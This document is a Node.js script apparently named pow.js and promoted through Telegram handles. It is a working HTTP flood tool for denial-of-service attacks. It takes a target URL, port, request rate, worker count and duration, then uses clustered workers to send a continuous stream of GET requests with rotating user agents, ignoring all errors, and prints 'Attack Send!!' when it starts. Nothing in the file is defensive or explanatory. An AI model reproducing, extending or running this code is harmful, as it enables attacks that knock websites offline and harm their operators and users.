//telegram -> @powshield | free proxy -> @udplegit
const http = require('http');
const url = require('url');
const net = require('net');
const fs = require('fs');
const cluster = require('cluster');

if (process.argv.length <= 5) {
  console.log('node pow.js <url> <port> <connect 1 - 9999> <threads> <time> [@powshield]');
  process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.host;
const port = process.argv[3];
const rps = process.argv[4];
const threads = process.argv[5];
const time = process.argv[6];

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (error) {});
process.on('unhandledRejection', function (error) {});

let userAgents = [];
try {
  userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (error) {
  console.error('you dont have ua go download!! ua.txt' + error);
  process.exit(-1);
}

const nullHexs = [
  "\x00",
  "\xFF",
  "\xC2",
  "\xA0"
];

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  
  
  console.log('Attack Send!! [@powshield]');
  setTimeout(() => {
    process.exit(1);
  }, time * 1000);
} else {
  startFlood();
}

function startFlood() {
  const interval = setInterval(() => {
    for (let i = 0; i < rps; i++) {
      const options = {
        host: parsed.host,
        port: port,
        path: target,
        method: 'GET',
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
          'Upgrade-Insecure-Requests': '1',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9',
          'Cache-Control': 'max-age=0',
          'Connection': 'Keep-Alive'
        }
      };

      http.get(options, (res) => {
        res.on('data', () => {}); // Discard response data
      }).on('error', (error) => {});
    }
  });

  setTimeout(() => clearInterval(interval), time * 1000);
}